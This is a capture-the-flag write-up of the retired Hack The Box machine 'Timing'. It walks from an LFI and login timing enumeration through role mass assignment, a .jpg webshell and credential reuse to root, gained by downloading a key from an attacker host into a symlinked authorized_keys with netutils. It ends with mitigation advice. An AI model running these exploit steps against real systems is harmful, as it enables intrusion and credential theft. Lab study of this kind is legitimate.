---
machine: Timing
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, web, php, lfi, timing-attack, mass-assignment, privesc]
---

# Timing — Hack The Box (Linux)

[🇪🇸 Español](README.md) | **English**

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

`image.php` has an LFI that reads source code. The login leaks usernames by timing and the app accepts `role` in JSON, so mass assignment turns the account into admin. As admin, upload a `.jpg` webshell and include it through the LFI. `aaron`'s password is in `db_conn.php`; `netutils` downloads as root and a symlink to `authorized_keys` gives root SSH.

## Recon

```bash
nmap -Pn -sCV -p22,80 <IP>
```

- `22` SSH and `80` Apache with PHP.
- `feroxbuster` finds `login.php`, `image.php`, `upload.php`, `admin/` and `db_conn.php`.
- `image.php?image=` loads an image from a path.

## Enumeration

- `image.php` is vulnerable to directory traversal and reads `db_conn.php` and the rest of the code.
- The login checks the username before the password; response time distinguishes valid users.
- Registration/profile accepts a JSON object and does not filter the `role` field.

```bash
curl 'http://<IP>/image.php?image=../../../../var/www/html/db_conn.php'
```

## Foothold

With a valid user, log in with the default password or crack it. Updating the profile sends `"role":"admin"` and the application accepts it (mass assignment). The admin panel allows a `.jpg` file with PHP; the LFI includes and runs it.

```json
{"username":"<USER>","role":"admin"}
```

```text
http://<IP>/image.php?image=uploads/<FILE>.jpg&cmd=id
```

## Lateral movement

The shell is `www-data`. `db_conn.php` contains the database and `aaron` passwords; the latter works over SSH.

```bash
grep -i 'password' /var/www/html/db_conn.php
ssh aaron@<IP>
```

## Privilege escalation

`aaron` can run `netutils` as root. The tool downloads a URL and saves the result in the current directory; create a `k.pub` symlink to `/root/.ssh/authorized_keys` and download your public key. SSH as root reads the flag.

```bash
ln -s /root/.ssh/authorized_keys k.pub
netutils http://<ATTACKER>/id_rsa.pub k.pub
ssh -i id_rsa root@<IP>
```

## Evidence

- LFI in `image.php` and source code.
- Timing attack and valid user.
- `role` mass assignment.
- `.jpg` webshell included through the LFI.
- `netutils` and symlink to `authorized_keys`.

## Lessons learned

- An LFI that reads code reveals credentials and authorization logic.
- Login response times leak users.
- Accepting `role` from the client is direct escalation.
- A root download with a controlled destination is arbitrary write.

## Mitigation and detection

- Normalize paths and use allowlists in `image.php`.
- Compare credentials in constant time and do not distinguish users.
- Assign roles only server-side and validate the schema.
- Avoid root downloads and use `O_NOFOLLOW`; review symlinks in user directories.

## References

- [0xdf — Timing](https://0xdf.gitlab.io/2022/06/04/htb-timing.html)
- [IppSec — Timing](https://www.youtube.com/watch?v=hmtnxLUqRhQ)
- [Hack The Box — Timing](https://app.hackthebox.com/machines/timing)
